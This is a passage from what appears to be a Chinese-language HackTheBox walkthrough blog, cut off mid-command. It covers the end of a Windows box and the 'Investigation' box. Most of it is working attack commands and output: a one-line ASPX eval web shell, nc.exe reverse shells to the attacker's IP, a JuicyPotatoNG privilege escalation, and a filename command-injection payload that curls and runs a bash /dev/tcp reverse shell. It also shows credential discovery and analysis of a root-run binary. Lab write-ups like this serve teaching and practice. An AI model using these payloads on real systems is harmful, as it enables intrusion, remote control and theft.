class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    Directory: C:\inetpub\development\development</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                css</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                fonts</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                img</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                js</span><br><span class="line">-a----        4&#x2F;16&#x2F;2018   2:23 PM           9371 contact.html</span><br><span class="line">-a----        4&#x2F;16&#x2F;2018   2:23 PM          45949 index.html</span><br></pre></td></tr></table></figure><p>尝试了以下，对路径有写权限</p><p>写入aspx WebShell</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Content -<span class="built_in">Path</span> &quot;C:\inetpub\development\development\BFL.aspx&quot; -Value &#x27;&lt;%@ Page Language=&quot;Jscript&quot;<span class="variable">%&gt;&lt;%</span>eval(Request.Item[&quot;BFL&quot;],&quot;unsafe&quot;);%&gt;&#x27;</span><br></pre></td></tr></table></figure><p>蚁剑连接后上传nc.exe</p><p><s>一开始找个nc不支持-e选项，笑嘻了</s></p><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9997</span><br></pre></td></tr></table></figure><p>反弹Shell</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cmd</span> /c <span class="built_in">start</span> nc.exe -e <span class="built_in">cmd</span> <span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">12</span> <span class="number">9997</span></span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                               State   </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled</span><br><span class="line">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain                Disabled</span><br><span class="line">SeAuditPrivilege              Generate security audits                  Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled </span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span><br></pre></td></tr></table></figure><p><code>SeImpersonatePrivilege</code>，一眼juicypotato</p><p>老的juicypotato好像对<code>Microsoft Windows Server 2019 Standard</code>无效</p><p>下载JuicyPotatoNG，解压并开启http服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip</span><br><span class="line">unzip JuicyPotatoNG.zip</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9995</span><br></pre></td></tr></table></figure><p>下载JuicyPotatoNG.exe和nc.exe，运行juicypotatong</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">Invoke-WebRequest -Uri &quot;http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">12</span>/JuicyPotatoNG.exe&quot; -OutFile &quot;./JuicyPotatoNG.exe&quot;</span><br><span class="line">Invoke-WebRequest -Uri &quot;http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">12</span>/nc.exe&quot; -OutFile &quot;./nc.exe&quot;</span><br><span class="line">./juicypotatoNG.exe -t t -p &quot;./nc.exe&quot; -a &quot;-e <span class="built_in">cmd</span> <span class="number">10</span>.<span class="number">10</span>.*.* <span class="number">9995</span></span><br></pre></td></tr></table></figure><p>获得反弹shell，查看root.txt</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f54fcef08f4ea67c6c7b406b2170b354</span><br></pre></td></tr></table></figure><hr /><blockquote><p>端口转发工具</p></blockquote><p>之前的lcx工具弄丢了，现在找的交叉编译跟Windows环境编译都能通过，但是都用不了</p><blockquote><p><a href="https://github.com/windworst/LCX">https://github.com/windworst/LCX</a><br /><a href="https://github.com/AA8j/SecTools/raw/main/lcx/lcx.exe">https://github.com/AA8j/SecTools/raw/main/lcx/lcx.exe</a></p></blockquote><p>搞半天连不通<br />网上找下第一个编译成elf第二个直接用还能连上，就这样吧</p><hr /><h1 id="hackthebox_investigation"><a class="markdownIt-Anchor" href="#hackthebox_investigation"></a> HackTheBox_Investigation</h1><h2 id="信息收集-9"><a class="markdownIt-Anchor" href="#信息收集-9"></a> 信息收集</h2><h3 id="端口扫描-26"><a class="markdownIt-Anchor" href="#端口扫描-26"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.197</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.197</span><br><span class="line">Host is up (1.2s latency).</span><br><span class="line">Not shown: 835 closed ports, 163 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.41</span><br><span class="line">Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="路径枚举-6"><a class="markdownIt-Anchor" href="#路径枚举-6"></a> 路径枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I http://10.10.11.197</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Date: Tue, 21 Mar 2023 11:51:08 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">Location: http:&#x2F;&#x2F;eforenzics.htb&#x2F;</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;iso-8859-1</span><br></pre></td></tr></table></figure><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.197\teforenzics.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>未枚举出有效路径</p><h2 id="漏洞利用-24"><a class="markdownIt-Anchor" href="#漏洞利用-24"></a> 漏洞利用</h2><p>请求<code>http://eforenzics.htb/service.html</code></p><p>上传文件功能位于<code>http://eforenzics.htb/upload.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><p>burpsuite中使用以下文件名进行RCE</p><p><code>filename=&quot;|`curl 10.10.16.8?BFL`|&quot;</code></p><p>本地httpserver接收到请求</p><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure><p>反弹Shell语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.*.*/9998 0&gt;&amp;1&#x27;</span> &gt; /tmp/BFL</span><br></pre></td></tr></table></figure><p>使用以下格式的文件名进行反弹Shell</p><p><code>filename=&quot;|`echo $BASE64_PAYLOAD | base64 -d`|&quot;</code></p><p>Base64编码前的命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl 10.10.*.*/BFL -o /tmp/BFL</span><br><span class="line">bash /tmp/BFL</span><br></pre></td></tr></table></figure><p>接收到Shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:107:112::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:108:113::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:109:115::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:110:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">usbmux:x:111:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:112:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">smorton:x:1000:1000:eForenzics:&#x2F;home&#x2F;smorton:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">backup:x:34:34::&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">fwupd-refresh:x:113:119:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_laurel:x:997:997::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>查找与用户<code>smorton</code>相关的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user smorton -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home&#x2F;smorton</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;investigation&#x2F;Windows Event Logs for Analysis.msg</span><br></pre></td></tr></table></figure><p>查看文件权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /usr/<span class="built_in">local</span>/investigation/Windows\ Event\ Logs\ <span class="keyword">for</span>\ Analysis.msg</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-rw-r-- 1 smorton smorton 1308160 Oct  1 00:35 &#x2F;usr&#x2F;local&#x2F;investigation&#x2F;Windows Event Logs for Analysis.msg</span><br></pre></td></tr></table></figure><p>查看Web路径权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /var/www/html/</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">total 44</span><br><span class="line">dr-xr-x--- 4 www-data www-data  4096 Jan  9 10:50 .</span><br><span class="line">dr-xr-x--- 4 www-data www-data  4096 Sep 30 22:26 ..</span><br><span class="line">drwxrwx--- 2 www-data www-data  4096 Mar 21 13:02 analysed_images</span><br><span class="line">dr-xr-x--- 7 www-data www-data  4096 Oct  1 00:31 assets</span><br><span class="line">-r-xr-x--- 1 www-data www-data 10957 Oct  1 00:31 index.html</span><br><span class="line">-r-xr-x--- 1 www-data www-data  4335 Oct  1 00:31 service.html</span><br><span class="line">-r-xr-x--- 1 www-data www-data  5193 Oct  1 00:31 upload.php</span><br></pre></td></tr></table></figure><p>更改Web路径权限并将文件移动至Web路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /var/www/html/</span><br><span class="line">cp /usr/<span class="built_in">local</span>/investigation/Windows\ Event\ Logs\ <span class="keyword">for</span>\ Analysis.msg /var/www/html/BFL.msg</span><br></pre></td></tr></table></figure><p>下载文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://eforenzics.htb/BFL.msg</span><br><span class="line">file BFL.msg</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BFL.msg: CDFV2 Microsoft Outlook Message</span><br></pre></td></tr></table></figure><blockquote><p>apt-get install evolution<br /><a href="https://www.zamzar.com/converters/document/msg/">https://www.zamzar.com/converters/document/msg/</a></p></blockquote><p>转换为pst格式文件并在evolution中打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hi Steve,</span><br><span class="line"></span><br><span class="line">Can you look through these logs to see if our analysts have been logging on to the inspection terminal. I&#39;m concerned that they are moving data on to production without following our data transfer procedures. </span><br><span class="line"></span><br><span class="line">Regards.</span><br><span class="line">Tom</span><br></pre></td></tr></table></figure><p>导出zip并解压后得到<code>security.evtx</code></p><blockquote><p>pip install python-evtx</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evtx_dump.py security.evtx &gt; sec.xml</span><br></pre></td></tr></table></figure><p>查找以下内容</p><p><code>&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;/EventID&gt;</code></p><p>某个匹配结果附近找到字符串<code>Def@ultf0r3nz!csPa$$</code></p><p>尝试登入SSH</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh smorton@10.10.11.197</span><br><span class="line">Def@ultf0r3nz!csPa$$</span><br></pre></td></tr></table></figure><p>登入成功，查看user.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/smorton/user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e98d3d1effe4d3e1d9e1dcb2574d7ac</span><br></pre></td></tr></table></figure><h2 id="权限提升-25"><a class="markdownIt-Anchor" href="#权限提升-25"></a> 权限提升</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for smorton on investigation:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User smorton may run the following commands on investigation:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;binary</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /usr/bin/binary</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r-xr-xr-- 1 root root 19024 Jan  5 16:02 &#x2F;usr&#x2F;bin&#x2F;binary</span><br></pre></td></tr></table></figure><p>在Web用户的Shell中更改Web路径权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /var/www</span><br><span class="line">chmod 777 /var/www/html</span><br></pre></td></tr></table></figure><p>移动文件至Web路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/bin/binary /var/www/html/</span><br></pre></td></tr></table></figure><p>获取文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://eforenzics.htb/binary</span><br></pre></td></tr></table></figure><p>IDA中反编译的主函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> *command; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( argc != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Exiting... &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( getuid() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Exiting... &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(argv[<span class="number">2</span>], <span class="string">&quot;lDnxUysaQn&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Exiting... &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Running... &quot;</span>);</span><br><span class="line">  stream = fopen(argv[<span class="number">2</span>], <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">  v5 = curl_easy_init();</span><br><span class="line">  curl_easy_setopt(v5, <span class="number">10002LL</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  curl_easy_setopt(v5, <span class="number">10001LL</span>, stream);</span><br><span class="line">  curl_easy_setopt(v5, <span class="number">45LL</span>, <span class="number">1LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)curl_easy_perform(v5) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Exiting... &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = <span class="built_in">snprintf</span>(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot;%s&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">  s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v6 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(s, v6 + <span class="number">1</span>, <span class="string">&quot;%s&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">  v7 = <span class="built_in">snprintf</span>(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot;perl ./%s&quot;</span>, s);</span><br><span class="line">  command = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v7 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(command, v7 + <span class="number">1</span>, <span class="string">&quot;perl ./%s&quot;</span>, s);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  curl_easy_cleanup(v5);</span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  system(command);</span><br><span class="line">  system(<span class="string">&quot;rm -f ./lDnxUysaQn&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>10002LL: This sets the URL to use for the request, and the value is passed in as the argv[1] parameter.</li><li>10001LL: This sets the output stream to use for the response, and the value is passed in as the stream parameter.</li><li>45LL: This sets the CURLOPT_VERBOSE option to 1, which causes libcurl to output verbose information about the request and response to the console.</li></ul><blockquote><p>Generated by ChatGPT</p></blockquote><p>大概意思是<code>curl argv[1] -o argv[2] -v</code></p><p>构造perl提权脚本并触发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec 